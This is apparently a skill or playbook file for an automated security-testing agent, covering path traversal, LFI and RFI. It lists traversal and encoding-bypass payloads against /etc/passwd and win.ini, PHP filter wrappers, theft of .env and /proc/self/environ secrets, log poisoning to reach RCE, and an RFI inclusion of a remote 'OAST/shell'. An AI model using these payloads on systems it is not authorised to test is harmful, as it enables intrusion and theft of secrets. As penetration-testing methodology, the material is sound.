---
name: path_traversal
class: path_traversal
summary: Find and prove path traversal / LFI / RFI (read sensitive files).
---
# Path Traversal / LFI / RFI

Reach files outside the intended directory, or include remote/local content.

## Attack surface
- File/path params: file, path, template, page, lang, download, doc, include,
  avatar, log; also archive extraction (zip-slip), image/PDF paths, i18n loaders.

## Recon
- Identify OS (unix vs windows) and whether the value is a filename vs full path.
- Baseline a valid file response.

## Techniques (escalate)
1. **Traversal**: `../../../../etc/passwd`, windows `..\..\..\windows\win.ini`.
2. **Encoding/filter bypass**: `%2e%2e%2f`, double-encode `%252e`, `....//`
   (strip-once bypass), null byte (legacy), UTF-8 overlong, absolute paths.
3. **LFI → more**: read app source/config (`.env`, settings), `/proc/self/environ`,
   PHP wrappers (`php://filter/convert.base64-encode/resource=`), log poisoning → RCE.
4. **RFI** (if remote includes allowed): `http://OAST/shell` and poll OAST.
5. **Zip-slip**: entry names with `../` in uploaded archives.

## Proof ladder
- L1: param accepts traversal. L2: different error for existing vs missing path.
- L3: sensitive file CONTENT returned (`root:.*:0:0` from /etc/passwd, config secrets).
- L4: source/secret disclosure enabling further compromise, or LFI→RCE chained.

## Validation / false positives
- A 404/permission error is not disclosure — require actual file *content*.
- Confirm the content is the real target file (e.g. `/etc/passwd` shape), not an
  app error echoing your path.
